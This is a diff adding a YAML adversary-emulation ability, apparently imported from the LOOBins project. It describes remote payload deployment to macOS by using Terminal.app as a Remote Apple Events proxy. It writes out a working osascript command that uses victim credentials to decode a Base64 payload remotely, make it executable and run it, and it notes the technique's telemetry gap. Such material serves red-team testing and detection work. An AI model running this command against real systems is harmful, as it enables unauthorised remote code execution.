@@ -1,0 +1,39 @@
+- id: 1d71166c-a935-f2b2-75bb-d92c9676260d
+  name: osascript - Remote payload deployment via Terminal.app as a Remote Apple Events proxy
+  description: The System Events application blocks remote do shell script execution via Remote Apple
+    Events (RAE), returning a -10016 Handler Error. Terminal.app does not have this restriction and accepts
+    remote do script commands over the eppc:// protocol. This makes Terminal.app an effective execution
+    proxy. Payloads are Base64-encoded before transmission to avoid AppleScript parsing errors (-2741)
+    caused by multi-line scripts. The deployment is a two-stage process - the first RAE command decodes
+    the payload to a temporary path and sets execute permissions, and the second invokes it via bash.
+    This technique can also be classified as a Software Deployment Tool (T1072) - it operates via Apple
+    Events IPC rather than standard shell processes, creating a telemetry gap in security tooling focused
+    on process execution trees.
+  tactic: execution
+  technique:
+    attack_id: T1059.002
+    name: 'Command and Scripting Interpreter: AppleScript'
+  platforms:
+    darwin:
+      sh:
+        command: "osascript <<EOF\ntell application \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\
+          \n    do script \"echo \\\"${PAYLOAD_B64}\\\" | base64 --decode > ${REMOTE_SCRIPT_PATH} && chmod\
+          \ +x ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF\n\nosascript <<EOF\ntell application\
+          \ \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\n    do script\
+          \ \"bash ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF"
+  singleton: false
+  privilege: User
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - osascript
+  - execution
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: osascript
+    use_case: Remote payload deployment via Terminal.app as a Remote Apple Events proxy
+    source_file: osascript.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-05-01T05:41:42.716097Z'
